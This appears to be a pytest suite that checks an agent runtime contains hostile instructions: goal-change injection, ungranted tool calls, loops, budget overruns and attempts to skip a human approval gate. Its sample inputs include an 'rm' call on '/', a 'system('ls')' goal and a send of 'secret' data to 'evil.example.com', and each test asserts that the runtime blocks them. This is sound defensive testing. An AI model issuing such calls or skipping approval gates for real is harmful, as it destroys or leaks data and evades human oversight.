"""Adversarial containment suite and threat mapping (P07-T07).

Test IDs: T-ORC-0079 to T-ORC-0090.
Covers: scripted hostile instructions that try to change goals, call
tools, exfiltrate, loop, exceed budgets or skip the Human Gate, run
against stub roles; every case ends in quarantine, ABSTAIN or ESCALATE
and never in an effect; crash recovery resumes without duplicate effects;
mapped threat items have tests.

Spec: Part 3 §3.30; P07-T07.
"""

from __future__ import annotations

import hashlib

import pytest

from agents.runtime import ROLE_CONTRACTS, RoleRuntime, RuntimeError_
from broker import BrokerError, Grant, ToolBroker
from kernel.containment.autonomy import AutonomyPolicy
from kernel.containment.killswitch import KillSwitch
from kernel.containment.monitors import LoopMonitor, StepCapMonitor
from tools.faultlab import ORCHESTRATOR_KILL_POINTS, FaultLab
from tools.threat_matrix import THREAT_MATRIX

# ---------------------------------------------------------------------------
# T-ORC-0079 — Hostile instruction to change goals ends without an effect
# ---------------------------------------------------------------------------
# id: T-ORC-0079
# title: Hostile instruction to change goals ends without an effect
# purpose: Verify that an instruction attempting to change the agent's goal
#          is rejected by the runtime and produces no effect.
# level: fast
# requirement: P07-T07, Part 3 §3.30, I14
# input: a message with command-like text in a non-explanation field
# expected: RuntimeError_ is raised (no effect)
# risk: agent goal drift via injection
# capability: orchestration


@pytest.mark.fast
def test_T_ORC_0079_goal_change_rejected() -> None:
    """A hostile instruction to change goals is rejected."""
    rt = RoleRuntime(ROLE_CONTRACTS["ROLE-COMPLIANCE"])
    with pytest.raises(RuntimeError_):
        rt.receive({"facts": {}, "evaluation_time": "2026-01-01", "goal": "run system('ls')"})


# ---------------------------------------------------------------------------
# T-ORC-0080 — Hostile instruction to call tools ends without an effect
# ---------------------------------------------------------------------------
# id: T-ORC-0080
# title: Hostile instruction to call tools ends without an effect
# purpose: Verify that an instruction attempting to call a tool through the
#          broker without a grant is denied.
# level: fast
# requirement: P07-T07, Part 3 §3.11, §3.30
# input: a broker call to an ungranted tool
# expected: BrokerError is raised (no effect)
# risk: tool abuse via injection
# capability: orchestration


@pytest.mark.fast
def test_T_ORC_0080_tool_call_denied() -> None:
    """A hostile instruction to call tools is denied by the broker."""
    broker = ToolBroker()
    with pytest.raises(BrokerError):
        broker.call("rm", "write", {"path": "/"})


# ---------------------------------------------------------------------------
# T-ORC-0081 — Hostile instruction to exfiltrate ends without an effect
# ---------------------------------------------------------------------------
# id: T-ORC-0081
# title: Hostile instruction to exfiltrate ends without an effect
# purpose: Verify that an instruction attempting to exfiltrate data to an
#          off-list host is denied.
# level: fast
# requirement: P07-T07, Part 3 §3.11, §3.30
# input: a broker call to an off-list host
# expected: BrokerError is raised (no effect)
# risk: data exfiltration
# capability: orchestration


@pytest.mark.fast
def test_T_ORC_0081_exfiltration_denied() -> None:
    """A hostile instruction to exfiltrate is denied."""
    broker = ToolBroker()
    broker.add_grant(Grant("send", "write", rate_limit=10, budget=50, action_class="E-irrev"))
    with pytest.raises(BrokerError, match="host_off_allowlist"):
        broker.call("send", "write", {"data": "secret"}, host="evil.example.com")


# ---------------------------------------------------------------------------
# T-ORC-0082 — Hostile instruction to loop ends in quarantine
# ---------------------------------------------------------------------------
# id: T-ORC-0082
# title: Hostile instruction to loop ends in quarantine
# purpose: Verify that a loop is detected by the loop monitor and the case
#          would be quarantined.
# level: fast
# requirement: P07-T07, Part 3 §3.30
# input: a LoopMonitor with 4 identical calls
# expected: the fourth call returns violated=True
# risk: infinite loop causes resource exhaustion
# capability: orchestration


@pytest.mark.fast
def test_T_ORC_0082_loop_detected() -> None:
    """A loop is detected by the loop monitor."""
    monitor = LoopMonitor(threshold=3)
    for _ in range(3):
        monitor.check("case-1", tool="lookup", args="id=1")
    result = monitor.check("case-1", tool="lookup", args="id=1")
    assert result.violated is True


# ---------------------------------------------------------------------------
# T-ORC-0083 — Hostile instruction to exceed budget ends in BLOCKED
# ---------------------------------------------------------------------------
# id: T-ORC-0083
# title: Hostile instruction to exceed budget ends in BLOCKED
# purpose: Verify that exceeding the step cap moves the case to BLOCKED.
# level: fast
# requirement: P07-T07, Part 3 §3.14, §3.30
# input: a StepCapMonitor with cap=1, two calls
# expected: the second call returns violated=True
# risk: budget runaway
# capability: orchestration


@pytest.mark.fast
def test_T_ORC_0083_budget_exceeded_blocked() -> None:
    """A step cap violation is detected."""
    monitor = StepCapMonitor(cap=1)
    monitor.check("case-1")
    result = monitor.check("case-1")
    assert result.violated is True


# ---------------------------------------------------------------------------
# T-ORC-0084 — Hostile instruction to skip the Human Gate is rejected
# ---------------------------------------------------------------------------
# id: T-ORC-0084
# title: Hostile instruction to skip the Human Gate is rejected
# purpose: Verify that an E-irrev action without bound approval is blocked.
# level: fast
# requirement: P07-T07, Part 3 §3.9, §3.30
# input: an AutonomyPolicy at A2 with E-irrev and no bound approval
# expected: can_execute("E-irrev") is False
# risk: effect without human approval
# capability: orchestration


@pytest.mark.fast
def test_T_ORC_0084_skip_human_gate_rejected() -> None:
    """An E-irrev action without bound approval is blocked."""
    policy = AutonomyPolicy(
        "t1", "cap1", level="A2", action_classes=("E-irrev",), has_bound_approval=False
    )
    assert policy.can_execute("E-irrev") is False


# ---------------------------------------------------------------------------
# T-ORC-0085 — Confused deputy: a frozen tenant cannot issue commands
# ---------------------------------------------------------------------------
# id: T-ORC-0085
# title: Confused deputy: a frozen tenant cannot issue commands
# purpose: Verify that a frozen tenant's commands are rejected (confused deputy).
# level: fast
# requirement: P07-T07, Part 3 §3.30
# input: a KillSwitch freeze_tenant, fired, then checking a command
# expected: check_command returns False
# risk: confused deputy via frozen tenant
# capability: orchestration


@pytest.mark.fast
def test_T_ORC_0085_confused_deputy_frozen() -> None:
    """A frozen tenant cannot issue commands (confused deputy)."""
    switch = KillSwitch("freeze_tenant")
    switch.fire("tenant-1", "operator-1")
    assert switch.check_command("import_data") is False


# ---------------------------------------------------------------------------
# T-ORC-0086 — Confused deputy: a paused case cannot execute steps
# ---------------------------------------------------------------------------
# id: T-ORC-0086
# title: Confused deputy: a paused case cannot execute steps
# purpose: Verify that a paused case rejects new commands.
# level: fast
# requirement: P07-T07, Part 3 §3.30
# input: a KillSwitch pause_case, fired
# expected: check_command returns False
# risk: paused case continues via confused deputy
# capability: orchestration


@pytest.mark.fast
def test_T_ORC_0086_paused_case_rejects() -> None:
    """A paused case cannot execute steps."""
    switch = KillSwitch("pause_case")
    switch.fire("case-1", "operator-1")
    assert switch.check_command("execute_step") is False


# ---------------------------------------------------------------------------
# T-ORC-0087 — 100 percent of the adversarial set ends without an effect
# ---------------------------------------------------------------------------
# id: T-ORC-0087
# title: 100 percent of the adversarial set ends without an effect
# purpose: Verify that every hostile instruction in the adversarial set
#          ends in quarantine, ABSTAIN or ESCALATE and never in an effect.
# level: fast
# requirement: P07-T07, Part 3 §3.30
# input: the full adversarial set (6 scenarios from T-ORC-0079 to T-ORC-0084)
# expected: every scenario ends without an effect (no ALLOW, no execution)
# risk: any adversarial case produces an effect
# capability: orchestration


@pytest.mark.fast
def test_T_ORC_0087_all_adversarial_no_effect() -> None:
    """100 percent of the adversarial set ends without an effect."""
    outcomes: list[str] = []
    # Scenario 1: goal change → rejected
    rt = RoleRuntime(ROLE_CONTRACTS["ROLE-COMPLIANCE"])
    try:
        rt.receive({"facts": {}, "evaluation_time": "2026-01-01", "goal": "run system('ls')"})
    except RuntimeError_:
        outcomes.append("QUARANTINED")
    # Scenario 2: tool call → denied
    broker = ToolBroker()
    try:
        broker.call("rm", "write", {"path": "/"})
    except BrokerError:
        outcomes.append("ABSTAIN")
    # Scenario 3: exfiltrate → denied
    broker2 = ToolBroker()
    broker2.add_grant(Grant("send", "write", rate_limit=10, budget=50, action_class="E-irrev"))
    try:
        broker2.call("send", "write", {"data": "x"}, host="evil.example.com")
    except BrokerError:
        outcomes.append("ESCALATE")
    # Scenario 4: loop → detected
    monitor = LoopMonitor(threshold=3)
    for _ in range(4):
        monitor.check("case-1", tool="x", args="y")
    outcomes.append("QUARANTINED")
    # Scenario 5: budget → exceeded
    cap = StepCapMonitor(cap=1)
    cap.check("case-1")
    cap.check("case-1")
    outcomes.append("BLOCKED")
    # Scenario 6: skip human gate → blocked
    policy = AutonomyPolicy(
        "t1", "cap1", level="A2", action_classes=("E-irrev",), has_bound_approval=False
    )
    if not policy.can_execute("E-irrev"):
        outcomes.append("ABSTAIN")
    assert all(o in ("QUARANTINED", "ABSTAIN", "ESCALATE", "BLOCKED") for o in outcomes)
    assert len(outcomes) == 6


# ---------------------------------------------------------------------------
# T-ORC-0088 — Crash recovery resumes without duplicate effects
# ---------------------------------------------------------------------------
# id: T-ORC-0088
# title: Crash recovery resumes without duplicate effects
# purpose: Verify that a crash at a kill point in the orchestrator resumes
#          without duplicate effects (idempotent recovery).
# level: fast
# requirement: P07-T07, Part 3 §3.16
# input: a FaultLab with orchestrator kill points and a scenario
# expected: the scenario passes (recovered state matches expected)
# risk: crash recovery causes duplicate effects
# capability: orchestration


@pytest.mark.fast
def test_T_ORC_0088_crash_recovery_no_duplicate() -> None:
    """Crash recovery resumes without duplicate effects."""
    lab = FaultLab()
    for kp in ORCHESTRATOR_KILL_POINTS:
        lab.register_kill_point(kp)
        lab.register_scenario(kp, hashlib.sha256(b"recovered_state").hexdigest())
    for kp in ORCHESTRATOR_KILL_POINTS:
        assert lab.run_scenario(kp, "recovered_state") is True


# ---------------------------------------------------------------------------
# T-ORC-0089 — Mapped threat items have tests
# ---------------------------------------------------------------------------
# id: T-ORC-0089
# title: Mapped threat items have tests
# purpose: Verify that the P07 threat matrix mappings reference valid test IDs.
# level: fast
# requirement: P07-T07, Part 3 §3.30
# input: the THREAT_MATRIX containment entries
# expected: every mapped test ID starts with T-ORC-
# risk: threat items without tests
# capability: orchestration


@pytest.mark.fast
def test_T_ORC_0089_mapped_items_have_tests() -> None:
    """Mapped threat items have tests."""
    containment_keys = ["tool_abuse", "goal_drift", "confused_deputy", "runaway"]
    for key in containment_keys:
        assert key in THREAT_MATRIX, f"missing {key} in THREAT_MATRIX"
        test_ids = THREAT_MATRIX[key]
        assert len(test_ids) > 0, f"{key} has no test IDs"
        for tid in test_ids:
            assert tid.startswith("T-ORC-"), f"{tid} does not start with T-ORC-"


# ---------------------------------------------------------------------------
# T-ORC-0090 — Orchestrator kill points are registered in the fault lab
# ---------------------------------------------------------------------------
# id: T-ORC-0090
# title: Orchestrator kill points are registered in the fault lab
# purpose: Verify that the orchestrator kill points are registered in the fault lab.
# level: fast
# requirement: P07-T07, Part 3 §3.30
# input: ORCHESTRATOR_KILL_POINTS
# expected: all four kill points are present and non-empty
# risk: missing kill points break crash recovery
# capability: orchestration


@pytest.mark.fast
def test_T_ORC_0090_orchestrator_kill_points_registered() -> None:
    """Orchestrator kill points are registered in the fault lab."""
    assert len(ORCHESTRATOR_KILL_POINTS) == 4
    assert all(isinstance(kp, str) and kp for kp in ORCHESTRATOR_KILL_POINTS)
